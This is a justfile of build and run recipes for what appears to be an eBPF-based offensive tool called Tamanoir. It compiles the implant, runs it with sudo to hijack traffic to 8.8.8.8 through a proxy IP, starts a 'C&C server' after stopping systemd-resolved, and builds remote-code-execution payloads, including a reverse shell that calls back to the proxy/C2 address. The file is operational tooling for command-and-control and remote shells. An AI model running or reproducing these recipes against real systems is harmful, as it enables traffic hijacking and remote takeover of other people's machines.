set export
_default:
    @just --list

_build-ebpf:
    cd tamanoir-ebpf && cargo build  --release

arch:="x86_64" # x86_64 , aarch64
proxy_ip:="192.168.1.15"

# Build Tamanoir
build-tamanoir:
    just _build-ebpf
    cargo build -p tamanoir --release

# Build C&C server
build-c2:
    cargo build -p tamanoir-c2 --release

# Build Tui
build-tui:
    cargo build -p tamanoir-tui --release


# Run Tamanoir
tamanoir-run  iface="wlan0" hijack_ip="8.8.8.8" log_level="info" :
    RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --iface {{iface}}

# Run tui
tui-run  grpc_port="50051" log_level="info":
    RUST_LOG={{log_level}} target/release/tamanoir-tui -i {{proxy_ip}} -p {{grpc_port}}

# Run c2 server
c2-run:
    sudo systemctl stop systemd-resolved && RUST_LOG=info sudo -E ./target/release/tamanoir-c2 start


# Rce build (run on c2 server)
rce_build_reverse_shell :
    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/reverse-shell  -b "IP={{proxy_ip}}" -t {{arch}}

rce_build_hello :
    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/hello -t {{arch}}

rce_build_xeyes :
    ./target/release/tamanoir-c2  rce  build  -c ./assets/payloads/xeyes -t {{arch}}

